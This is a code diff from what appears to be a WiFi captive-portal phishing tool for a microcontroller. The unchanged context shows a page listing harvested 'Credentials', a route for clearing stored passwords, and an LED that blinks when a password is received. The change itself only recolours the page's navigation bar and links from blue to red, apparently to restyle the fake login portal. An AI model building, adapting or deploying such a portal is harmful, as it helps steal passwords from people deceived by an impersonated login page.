@@ -36,7 +36,7 @@ String header(String t) {
     "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
     "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
     "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
-    "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
+    "nav { background: #e40001; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
     "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
     "textarea { width: 100%; }";
   String h = "<!DOCTYPE html><html>"
@@ -47,7 +47,7 @@ String header(String t) {
   return h; }
 
 String creds() {
-  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
+  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:#e40001\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
 }
 
 String index() {
@@ -67,7 +67,7 @@ String clear() {
   String email="<p></p>";
   String password="<p></p>";
   Credentials="<p></p>";
-  return header(CLEAR_TITLE) + "<div><p>The credentials list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
+  return header(CLEAR_TITLE) + "<div><p>The credentials list has been reseted.</div></p><center><a style=\"color:#e40001\" href=/>Back to Index</a></center>" + footer();
 }
 
 void BLINK() { // The internal LED will blink 5 times when a password is received.
